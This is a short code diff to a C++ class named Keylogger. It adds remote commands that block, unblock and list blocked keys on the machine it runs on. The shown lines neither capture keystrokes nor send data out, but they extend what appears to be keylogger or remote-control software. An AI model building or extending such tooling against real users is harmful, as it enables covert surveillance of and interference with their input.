@@ -35,7 +35,22 @@ Keylogger::Keylogger() {
 		for (auto key = keys.begin(); key != keys.end(); key++) {
 			KeyBlockService::getInstance()->addBlockedKey(*key);
 		}
-		return L"Not implemented now";
+		return L"ok";
+	});
+	CommandParser::addCommand(L"unblock", [this](std::wstring argStr) {
+		auto keys = StringUtilities::splitString(argStr, L" ");
+		for (auto key = keys.begin(); key != keys.end(); key++) {
+			KeyBlockService::getInstance()->removeBlockedKey(*key);
+		}
+		return L"ok";
+	});
+	CommandParser::addCommand(L"showblocked", [this](std::wstring argStr) {
+		auto blockedKeys = KeyBlockService::getInstance()->getBlockedList();
+		std::wstringstream responseStream;
+		for (auto it = blockedKeys.begin(); it != blockedKeys.end(); it++) {
+			responseStream << *it << L" ";
+		}
+		return responseStream.str();
 	});
 
 	this->isActive = false;
